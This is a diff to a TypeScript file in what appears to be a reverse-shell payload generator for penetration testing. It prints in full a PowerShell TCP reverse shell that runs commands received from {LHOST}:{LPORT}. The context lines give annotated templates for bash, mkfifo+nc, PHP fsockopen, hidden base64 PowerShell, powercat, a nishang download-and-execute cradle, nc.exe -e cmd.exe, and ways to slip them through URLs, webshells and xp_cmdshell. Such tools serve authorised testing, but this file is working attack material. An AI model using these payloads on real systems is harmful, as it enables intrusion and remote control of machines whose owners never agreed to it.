@@ -1,5 +1,7 @@
-import type { PayloadDef } from "./types";
+import { POWERSHELL_TCP } from "./psScripts";
+import type { ListenerId, PayloadDef } from "./types";
 
+const REVERSE: ListenerId[] = ["penelope", "rlwrap-nc"];
 const SH_PART = { token: "/bin/sh -i", explain: "-i: interactive shell. /bin/sh is used because it exists everywhere; the pipe, not the shell, does the work." };
 const FIFO_PARTS = [
   { token: "rm -f /tmp/f", explain: "-f: no error if the pipe does not exist yet; clears a stale one from a previous try." },
@@ -18,11 +20,6 @@ const SERVE_PART = {
   explain: "On Kali, from the folder with the file: serves it on port 80, or on 8000 when your listener takes 80 (the cradle URL then says :8000). Leave it running until the shell connects.",
 };
 const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;
-const POWERSHELL_SCRIPT =
-  '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
-  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
-  '$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
-  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
 
 export const REVERSE_SHELLS: PayloadDef[] = [
   {
@@ -37,11 +34,11 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "0>&1", explain: "Feeds the socket back in as stdin, so you can type." },
       { token: "bash -c", explain: "-c: added outside a real bash prompt (injection, URL, system()) so dash does not choke on >& and /dev/tcp." },
     ],
-    listener: "penelope",
+    listeners: REVERSE,
   },
   {
     id: "mkfifo-nc", generator: "shell", title: "mkfifo + nc", os: "linux",
-    contexts: [...ALL_LINUX], requires: ["nc"], template: FIFO, parts: [...FIFO_PARTS, BASH_C_PART], listener: "penelope",
+    contexts: [...ALL_LINUX], requires: ["nc"], template: FIFO, parts: [...FIFO_PARTS, BASH_C_PART], listeners: REVERSE,
     notes: ["Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e')."],
   },
   {
@@ -53,7 +50,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       BASH_C_PART,
       { token: ") &", explain: "Backgrounds the group so it survives a parent that reaps its children (UDF, popen, request worker)." },
     ],
-    listener: "penelope", background: true,
+    listeners: REVERSE, background: true,
     notes: ["Use when the shell connects and then dies at once: the parent process is reaping it."],
   },
   {
@@ -67,7 +64,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "pty.spawn(", explain: "Starts bash on a PTY, so su and sudo prompts work from the first prompt." },
       BASH_C_PART,
     ],
-    listener: "penelope",
+    listeners: REVERSE,
   },
   {
     id: "php-exec", generator: "shell", title: "PHP fsockopen", os: "linux",
@@ -80,19 +77,19 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "<&3 >&3 2>&3", explain: "Assumes the socket is file descriptor 3. If nothing arrives, try 4 or 5." },
       BASH_C_PART,
     ],
-    listener: "penelope",
+    listeners: REVERSE,
   },
   {
     id: "ps-b64", generator: "shell", title: "PowerShell base64 (-e)", os: "windows",
     contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"],
-    requires: ["powershell"], template: POWERSHELL_SCRIPT, encodePowerShell: true,
+    requires: ["powershell"], template: POWERSHELL_TCP, encodePowerShell: true,
     parts: [
       { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks in cmd, a URL or a SQL string." },
       { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
       { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
       { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Plain UTF-8 base64 produces garbage." },
     ],
-    listener: "penelope",
+    listeners: REVERSE,
     notes: ["A working shell makes the web request hang. If it returns at once, the payload did not hold the socket."],
   },
   {
@@ -108,7 +105,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "-p", explain: "-p: the listener's port." },
       { token: "-e powershell", explain: "-e: program to attach to the socket. Use cmd for a cmd shell." },
     ],
-    listener: "penelope", prepare: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", serve: SERVE,
+    listeners: REVERSE, prepare: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", serve: SERVE,
     notes: ["Run from a PowerShell prompt. To use it from cmd, a macro or a SQL string, base64 it for -e first."],
   },
   {
@@ -129,7 +126,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "IEX(", explain: "Runs the downloaded rev.ps1 in memory." },
       { token: "rev.ps1", explain: "Your served reverse-shell script. It has LHOST and LPORT inside, so regenerate it after a VPN IP change." },
     ],
-    listener: "penelope", bakesIp: true, serve: SERVE,
+    listeners: REVERSE, bakesIp: true, serve: SERVE,
     prepare: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}' >> rev.ps1",
     notes: ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."],
   },
@@ -142,7 +139,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
       { token: "-e", explain: "-e: run this program and attach it to the socket." },
       { token: "cmd.exe", explain: "The program handed to the connection." },
     ],
-    listener: "penelope",
+    listeners: REVERSE,
     notes: ["Needs an nc.exe built with -e; if it returns instantly, the build has no -e."],
   },
 ];
